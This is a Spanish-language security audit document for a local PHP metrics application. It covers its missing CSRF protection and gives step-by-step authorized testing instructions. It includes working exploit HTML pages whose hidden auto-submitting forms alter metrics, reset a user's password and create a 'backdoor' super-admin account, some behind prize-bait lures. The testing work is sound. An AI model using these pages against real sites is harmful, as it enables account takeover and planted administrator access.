# 🔓 VULNERABILIDAD #2: Cross-Site Request Forgery (CSRF)

## ⚠️ SEVERIDAD: MEDIA-ALTA

---

## 📋 FASE 1: DEMOSTRACIÓN DEL ATAQUE

### ¿Qué es CSRF?

**CSRF** permite a un atacante hacer que un usuario autenticado ejecute acciones sin su consentimiento, aprovechando que el navegador envía automáticamente las cookies de sesión.

### Archivos Vulnerables Identificados

| Archivo | Vulnerabilidad | Impacto |
|---------|----------------|---------|
| `captura-valores.php` | Sin token CSRF | Modificar métricas |
| `usuarios.php` | Sin token CSRF | Crear/editar/eliminar usuarios |
| `metricas.php` | Sin token CSRF | Crear/modificar métricas |
| `areas.php` | Sin token CSRF | Modificar áreas |
| `departamentos.php` | Sin token CSRF | Modificar departamentos |
| `perfil.php` | Sin token CSRF | Cambiar contraseña de usuario |

### Ejemplo de Código Vulnerable

```php
// captura-valores.php línea 25
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    // ❌ NO HAY VALIDACIÓN DE TOKEN CSRF
    $periodo_id = (int)$_POST['periodo_id'];
    $area_id = (int)$_POST['area_id'];
    
    // Guardar valores directamente
    $valorModel->create($data);
}
```

**Problema:** Solo verifica que el usuario esté autenticado (sesión), pero NO verifica que la petición provenga del sitio legítimo.

---

## 💥 ESCENARIOS DE ATAQUE

### Ataque 1: Modificar Valores de Métricas

Un atacante crea una página maliciosa que modifica métricas del usuario autenticado:

**Archivo: `csrf-exploit-metricas.html`**

```html
<!DOCTYPE html>
<html>
<head>
    <title>¡Ganaste un iPhone 15! 🎁</title>
</head>
<body>
    <h1>Felicidades, haz clic para reclamar tu premio</h1>
    <button onclick="document.getElementById('csrf-form').submit()">
        🎁 RECLAMAR PREMIO
    </button>

    <!-- Formulario oculto que envía datos falsos -->
    <form id="csrf-form" action="http://localhost/metricas-it/public/captura-valores.php" method="POST" style="display:none;">
        <input type="hidden" name="action" value="guardar_valores">
        <input type="hidden" name="periodo_id" value="1">
        <input type="hidden" name="area_id" value="1">
        
        <!-- Modificar métrica 1 -->
        <input type="hidden" name="metricas[1][valor]" value="999999">
        <input type="hidden" name="metricas[1][nota]" value="Hackeado por CSRF">
        
        <!-- Modificar métrica 2 -->
        <input type="hidden" name="metricas[2][valor]" value="0">
        <input type="hidden" name="metricas[2][nota]" value="Sistema comprometido">
    </form>

    <script>
        // Auto-submit al cargar la página (ataque invisible)
        // document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

**¿Cómo funciona?**

1. Usuario está autenticado en `http://localhost/metricas-it/`
2. Atacante le envía link a `http://sitiomalicioso.com/csrf-exploit-metricas.html`
3. Usuario hace clic en "Reclamar Premio"
4. El formulario se envía a `captura-valores.php` con las cookies de sesión del usuario
5. ✅ El servidor acepta la petición (sesión válida)
6. 💥 Las métricas se modifican sin que el usuario lo sepa

### Ataque 2: Cambiar Contraseña del Usuario

**Archivo: `csrf-exploit-password.html`**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Ver reporte mensual</title>
</head>
<body>
    <h1>Cargando reporte...</h1>

    <!-- Formulario que cambia la contraseña del usuario -->
    <form id="csrf-form" action="http://localhost/metricas-it/public/perfil.php" method="POST">
        <input type="hidden" name="action" value="actualizar_password">
        <input type="hidden" name="password_actual" value="">
        <input type="hidden" name="password_nueva" value="hacked123">
        <input type="hidden" name="password_confirmar" value="hacked123">
    </form>

    <script>
        // Auto-submit
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

**Impacto:** Atacante cambia la contraseña del usuario y toma control de la cuenta.

### Ataque 3: Crear Usuario Super Admin (Si es admin)

**Archivo: `csrf-exploit-create-admin.html`**

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Actualizando sistema...</h1>

    <form id="csrf-form" action="http://localhost/metricas-it/public/admin/usuarios.php" method="POST">
        <input type="hidden" name="action" value="crear">
        <input type="hidden" name="username" value="backdoor">
        <input type="hidden" name="password" value="Hack3d!2026">
        <input type="hidden" name="nombre" value="Backdoor Admin">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="rol" value="super_admin">
        <input type="hidden" name="departamento_id" value="">
        <input type="hidden" name="area_id" value="">
    </form>

    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

**Impacto:** Si un super_admin visita esta página, se crea un usuario backdoor con permisos totales.

---

## 🧪 PRUEBA PRÁCTICA

### Paso 1: Crear archivo de exploit

Guarda este archivo como `C:\xampp\htdocs\csrf-test.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>PRUEBA CSRF - Métricas</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        .warning { background: #ff4444; color: white; padding: 10px; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="warning">
        ⚠️ PRUEBA DE SEGURIDAD - CSRF ATTACK
    </div>

    <h2>Prueba de Vulnerabilidad CSRF</h2>
    <p>Si haces clic en el botón, se modificarán valores de métricas sin validación CSRF.</p>

    <button onclick="document.getElementById('csrf-form').submit()">
        🔴 EJECUTAR ATAQUE CSRF
    </button>

    <form id="csrf-form" action="http://localhost/metricas-it/public/captura-valores.php" method="POST" style="display:none;">
        <input type="hidden" name="action" value="guardar_valores">
        <input type="hidden" name="periodo_id" value="1">
        <input type="hidden" name="area_id" value="1">
        <input type="hidden" name="metricas[1][valor]" value="777">
        <input type="hidden" name="metricas[1][nota]" value="CSRF Attack - Valor modificado desde sitio externo">
    </form>

    <div id="resultado"></div>
</body>
</html>
```

### Paso 2: Autenticarse en el sistema

1. Abre `http://localhost/metricas-it/`
2. Inicia sesión con tus credenciales
3. **NO cierres esa pestaña**

### Paso 3: Ejecutar el exploit

1. Abre NUEVA PESTAÑA en el mismo navegador
2. Ve a `http://localhost/csrf-test.html`
3. Haz clic en "🔴 EJECUTAR ATAQUE CSRF"

### Paso 4: Verificar el impacto

1. Vuelve a `http://localhost/metricas-it/public/captura-valores.php`
2. Selecciona Periodo 1, Área 1
3. **¿La métrica #1 tiene valor 777 con nota "CSRF Attack"?**

✅ **SI APARECE = VULNERABILIDAD CONFIRMADA**

---

## 📊 VECTORES DE ATAQUE POSIBLES

| Vector | Método | Probabilidad |
|--------|--------|--------------|
| Email malicioso con link | HTML + Auto-submit | ALTA |
| Imagen con src=form | `<img src="...">` | MEDIA |
| XSS en otro sitio | JavaScript | ALTA |
| Iframe oculto | `<iframe style="display:none">` | ALTA |
| Redes sociales | Link disfrazado | MEDIA |

---

## 🎯 IMPACTO TOTAL

### Datos Comprometidos:
- ✅ Modificar valores de métricas
- ✅ Modificar metas
- ✅ Crear/editar/eliminar usuarios
- ✅ Cambiar configuraciones
- ✅ Cambiar contraseñas de usuarios
- ✅ Eliminar áreas y departamentos

### Nivel de Privilegios:
- **Viewer:** Puede modificar valores en su área
- **Admin:** Puede crear/modificar usuarios y configuraciones
- **Super Admin:** Control total del sistema

---

## 📝 REGISTRO DE PRUEBA

**Fecha:** _______________________
**Probado por:** _______________________

### Resultado de Prueba 1 (Modificar métricas):
```
□ Exitoso - El valor se modificó
□ Fallido - Error o bloqueado
```

### Resultado de Prueba 2 (Cambiar contraseña):
```
□ Exitoso - Contraseña cambiada
□ Fallido - Error o bloqueado
```

### Notas adicionales:
```
_____________________________________________________________
_____________________________________________________________
```

---

## 🔒 PRÓXIMO PASO: IMPLEMENTAR SOLUCIÓN

La solución incluirá:
1. ✅ Clase `CsrfProtection` para generar/validar tokens
2. ✅ Tokens únicos por sesión
3. ✅ Validación en todos los formularios POST
4. ✅ Middleware automático
5. ✅ Re-probar exploit (debe fallar con error 403)

---

**IMPORTANTE:** Este documento es para pruebas autorizadas en tu propio sistema.
